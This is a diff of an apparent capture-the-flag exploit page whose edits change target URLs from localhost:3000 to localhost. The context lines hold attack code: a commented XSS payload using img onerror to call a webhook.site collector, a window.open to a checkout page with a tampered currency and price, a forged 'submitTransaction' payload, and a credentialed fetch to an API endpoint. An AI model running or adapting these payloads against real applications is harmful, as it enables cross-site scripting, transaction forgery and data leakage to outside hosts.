@@ -3,7 +3,7 @@
     <script>        
         //const xssPayload = '\"\u003E\u003Cimg src=x onerror=fetch(`https://webhook.site/3bebad70-172f-48e4-b855-b4a268be6ca9/XSS_SUCCESS`)\u003E';
 
-        const win = window.open("http://localhost:3000/checkout.html?currency=1337COIN&price=1000000", "_blank");
+        const win = window.open("http://localhost/checkout.html?currency=1337COIN&price=1000000", "_blank");
         const payload = {
         type: "submitTransaction",
         transaction: {
@@ -23,7 +23,7 @@
         
       
 
-fetch('http://localhost:3000/api/marketwatch',  {
+fetch('http://localhost/api/marketwatch',  {
   method: "GET",
   credentials: "include"
 })
